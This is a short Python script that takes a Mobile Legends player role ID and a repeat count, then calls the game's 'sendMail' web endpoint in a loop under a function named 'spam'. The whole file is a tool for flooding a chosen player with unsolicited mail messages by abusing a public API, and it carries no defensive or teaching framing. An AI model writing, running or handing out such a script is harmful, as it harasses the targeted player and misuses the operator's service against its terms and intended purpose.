import requests as req
import json
import time

def spam(reqId):

    headers = {
    'authority': 'api.mobilelegends.com',
    'content-type': 'application/json',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9'
    }

    params = {
        'roleId': reqId,
        'language': 'en',
    }

    response = req.get('https://api.mobilelegends.com/mlweb/sendMail', params=params, headers=headers)

    return response.json()

    
if __name__ == '__main__':

    reqId = input('? ID : ')
    reqHowMany = input('? How many times : ')

    for i in range(int(reqHowMany)):

        print(spam(reqId))
